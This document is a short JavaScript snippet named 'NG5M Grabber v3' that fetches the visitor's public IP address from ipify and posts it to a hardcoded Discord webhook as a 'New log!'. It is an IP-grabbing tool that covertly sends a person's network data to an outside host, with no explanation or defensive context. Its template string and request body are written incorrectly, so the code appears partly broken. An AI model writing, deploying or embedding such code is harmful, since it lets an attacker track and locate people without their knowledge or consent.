var a = new XMLHttpRequest();

a.open("GET","https://api64.ipify.org");
a.onreadystatechange = function () {
    if (this.readyState === 4) {
        data = {
            "content":"New log!",
            "username":"NG5M Grabber v3"
        }

        data["embeds"] = [
            {
                "description":`IP: {this.responseText}`,
                "title":"Info"
            }
        ]

        fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":data});
    }
};

a.send();
